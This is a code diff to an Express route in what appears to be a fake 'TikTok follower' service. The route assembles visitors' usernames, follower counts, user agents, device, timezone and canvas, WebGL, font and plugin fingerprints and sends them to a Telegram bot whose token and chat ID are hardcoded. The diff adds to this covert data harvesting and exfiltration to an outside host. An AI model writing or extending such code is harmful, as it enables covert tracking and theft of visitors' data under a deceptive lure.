@@ -20,14 +20,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8070873055:AAHRpIvi56j4F2h0BhBA_uB4tyw_SCYMsVM";
       const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6360165707";
       
-      // Format message with detailed visitor info
+      // Format message with detailed visitor info - collect and display raw, authentic data
       const message = `
 🔥 New TikTok Follower Request 🔥
 👤 Username: @${username}
 ⭐ Followers: ${followers}
 
 📱 Device Info:
-- Device: ${userInfo.deviceModel || 'Unknown Device'}
+- Raw User Agent: ${userInfo.userAgent}
 - Screen: ${userInfo.screenSize}
 - Color Depth: ${userInfo.colorDepth}
 - Platform: ${userInfo.platform}
@@ -48,14 +48,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 - Timezone: ${userInfo.timezone}
 - Offset: ${userInfo.timezoneOffset}
 
-🔍 Fingerprints:
+🔍 Raw Browser Data:
 - Canvas: ${userInfo.canvasFingerprint || 'Not available'}
 - WebGL: ${userInfo.webglFingerprint || 'Not available'}
 - Fonts: ${userInfo.fonts || 'Not available'}
 - Plugins: ${userInfo.plugins || 'Not available'}
-
-🧩 User Agent:
-${userInfo.userAgent}
       `;
       
       // Send to Telegram - without parse_mode to avoid formatting errors
